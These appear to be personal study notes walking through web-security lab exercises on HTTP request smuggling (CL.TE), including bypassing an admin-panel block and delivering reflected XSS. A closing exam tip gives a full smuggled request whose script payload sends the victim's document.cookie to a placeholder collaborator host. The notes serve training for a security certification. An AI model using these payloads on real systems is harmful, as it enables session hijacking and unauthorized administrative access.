
#### 1.1. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses ⭕️
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.
##### Automated Method

Test
![image](Assets/Images/HTTP%20Request%20Smuggling-20260128210501980.png)

##### Manual Method
1. Send `GET /` to Repeater > change `HTTP/2` to `HTTP/1.1` > Send > 200 OK.
	1. ![[HTTP Request Smuggling-20260128210501980.png]]
2. Right click > change request method (will change to `POST`). Optional: remove unnecessary headers. Toggle on `\n` button to show non-printable characters. Uncheck Update Content-Length.
3. Set the following and notice it takes a long time for the server to respond and eventually get a timeout. CL.TE attack might be possible.
	1. `Content-Length: 6`
	2. Add `Transfer-Encoding: chunked`
	3. Follow the screenshot for the rest
	4. ![[HTTP Request Smuggling-20260128211151617.png]]
4. Rename the `POST` request to Attacker and send the `GET /` request to Repeater and name it Victim. Downgrade `HTTP/2` to `HTTP/1.1`. 
5. Attacker request: check Update Content-Length.
6. Set the Attacker request like the screenshot > Send > get 200 OK
	1. ![[HTTP Request Smuggling-20260128213502477.png]]
7. Victim request > Send > expect a 404. HTTP Request Smuggling success and lab solved.

>For whatever reason, my victim request only gave 200 OK but it solved the lab...
>![[HTTP Request Smuggling-20260128213615894.png]]

>[!tip] Why `X-Ignore` header?
>This is how the server interpret this request: the victim's request will be appended to the `X-Ignore: X` header so it will be ignored. Thus, next time the victim requests `/`, it will get the `GET /404` endpoint instead. 
>
>![[HTTP Request Smuggling-20260128212530144.png]]

>[!tip] How to Identify this Vulnerability
>1. `HTTP/2` 
>2. No `Transfer-Encoding: chunked` header
>3. Got `500 Internal Server Error` Read timed out after the `Transfer-Encoding` request 

---
#### 1.x. Lab: HTTP request smuggling, basic CL.TE vulnerability ⭕️
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

1. `GET /` to Repeater > change to HTTP/1.1 > change request method > remove unnecessary headers > uncheck Update Content-Length > show non-printable characters. Send and get 200 OK.
	1. ![[HTTP Request Smuggling-20260201203746455.png]]
![[HTTP Request Smuggling-20260201203810322.png]]

2. Using the payload below > Send > got a "Communication timed out" error meaning we have a CL.TE vulnerability.
	1. ![[HTTP Request Smuggling-20260201204027937.png]]
```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```

3. Send the same `GET /` request to repeater > rename to victim > repeat Step 1. Add `foo=bar` in the body and get a 200 OK.
	1. ![[HTTP Request Smuggling-20260201204343040.png]]
4. Attacker request
	1. Change lines 7-9 like the screenshot > manually update the content length to `6` (highlight the parts in the screenshot to get your number) > Send > 200 OK.
		1. ![[HTTP Request Smuggling-20260201204620354.png]]
5. Victim request
	1. Send request and get an error: "Unrecognized method GPOST" and solve.
		1. ![[HTTP Request Smuggling-20260201204708606.png]]

>[!tip] How to Identify this Vulnerability
>1. 

---
#### 1.3. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ⭕️
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

1. Repeat Step 1 from the lab above to set up both the attacker and victim requests. A little different this time (due to the solution video), for the attacker's request, follow the screenshot below and Send and should get a 200 OK.
	1. ![[HTTP Request Smuggling-20251111153223019.png]]
2. Uncheck the Update Content-Length setting for the attacker request for this test. Add `GET` pointing to a resource that doesn't exist like `/doesntExist` and Send -- should get 200 OK. Then over at the victim's request, click Send, will see a 400 Bad Request. **This means the smuggling is successful bc we sent the GET request to the server (attacker request) and now the victim is trying to access the `GET /doesntExist` resource. It doesn't exist, hence the bad request.**
	1. ![[HTTP Request Smuggling-20251111153010278.png]]
	2. ![[HTTP Request Smuggling-20251111153454190.png]]
	3. ![[HTTP Request Smuggling-20251111153633836.png]]
3. Attacker's request, add this arbitrary header `Jarno: x` but don't insert a new line `\r\n`, Send, get 200 OK. Now to the victim's request, Send, and see a 404 Not Found this time. **This means it works???** 
	1. ![[HTTP Request Smuggling-20251111154202542.png]]
	2. ![[HTTP Request Smuggling-20251111154219231.png|309]]
4. Attacker's request: change the `/doesntExist` to `/admin`, Send, get 200 OK. Victim's request: Send and got 401 unauthorized. Error "Admin interface only available to local users".
	1. ![[HTTP Request Smuggling-20251111154402451.png]]
5. Attacker's request: add `Host: localhost`, Send, get 200 OK. Victim's request: Send, get error "Duplicate header names are not allowed."
	1. ![[HTTP Request Smuggling-20251111154522000.png]]
	2. ![[HTTP Request Smuggling-20251111154540418.png]]
6. So if you copy the victim's request and paste it after `Jarno: x` in the attacker's request, you can see why the error came up: what the server is processing is the `Host: localhost` header and the `Host: 0ad800...` So we'll have to fix this by setting the victim's request as the **request body**.
	1. ![[HTTP Request Smuggling-20251111154804779.png]]
7. Don't need that `Jarno: x` header anymore so replace it with Content-Type, Content-Length, and `x=` like so. Set the Content-Length to 3 and Send, get 200 OK.
	1. ![[HTTP Request Smuggling-20251111155334703.png]]
	2. This is what it looks like to the server by adding `x=`. 
		1. ![[HTTP Request Smuggling-20251111155211454.png]]
8. Victim's request: send and got 200 OK. Follow Step 10 from the previous lab and solved. 
#TODO 
> Try the [github guide's method](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#clte-multicase---admin-blocked) (seems faster and less steps) instead of this.

**Use in exam**
This is to get access into the admin panel so this belongs in Stage 2. HTTP Request Smuggler should identify this as `CL.TE multiCase (delayed response)`. 

- - - 
#### 1.7. Lab: Exploiting HTTP request smuggling to deliver reflected XSS ⭕️
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
The application is also vulnerable to reflected XSS via the `User-Agent` header.
To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.
> In the exam, we'd need to use `document.cookie` and Burp Collaborator to retrieve the victim's session cookie.

1. Confirm XSS: Go to a blog post, send the `GET` request to repeater, search for `Mozilla` (which is in the user agent) on the response and we got a hit. 
	1. ![[HTTP Request Smuggling-20260105151306121.png]]
2. Change the user agent to something like `foobar"><script>alert(1)</script>`, Send, request in browser and this confirms that response is reflecting user input and we can exploit XSS. 
	1. ![[HTTP Request Smuggling-20260105151513160.png]]
	2. ![[HTTP Request Smuggling-20260105151534363.png]]
3. Determine the vulnerability: CL.TE or TE.CL?
	1. Automated Method: Use HTTP Smuggler to confirm the vulnerability: Send `/` to Repeater and use Smuggler Probe. **CL.TE vulnerability**. CL.TE multiCase (delayed response)
		1. ![[HTTP Request Smuggling-20260105151953125.png]]
	2. Manual Method: Uncheck Update Content Length, change to HTTP/1.1, change to POST, get rid of every header except ones in the screenshot, and set it up like the screenshot. Send. If it takes very long to get a response (timeout), then this is a **CL.TE vulnerability**.
		1. ![[HTTP Request Smuggling-20260105152445147.png|392]]
4. Set up the request like in the screenshot and **check Update Content Length**.
	1. ![[HTTP Request Smuggling-20260105152746929.png]]
	2. On line 11 we get the Content-Length to 3 because `x=` is 2 bytes and we need to add 1. 
5. Send and we should get a 200 OK. Go to the browser and go to the `/` landing page or click Home. We should see Not Found. This is because we successfully smuggled the `/doesntExist` endpoint. It doesn't exist so we see Not Found.
	1. ![[HTTP Request Smuggling-20260105152935512.png]]
6. Modify the request to set `GET` to `/post?postId=7` and add the User-Agent header with the XSS payload.
	1. ![[HTTP Request Smuggling-20260105153350315.png]]
7. Send, visit blog post Id=7, and lab solved.

#ExamTip Use this payload to grab the victim's session cookie. Replace `TARGET.net` with the app's domain and `OASTIFY.com` with your own collaborator URL.
```
POST / HTTP/1.1
Host: TARGET.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://OASTIFY.COM/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```
- - - 









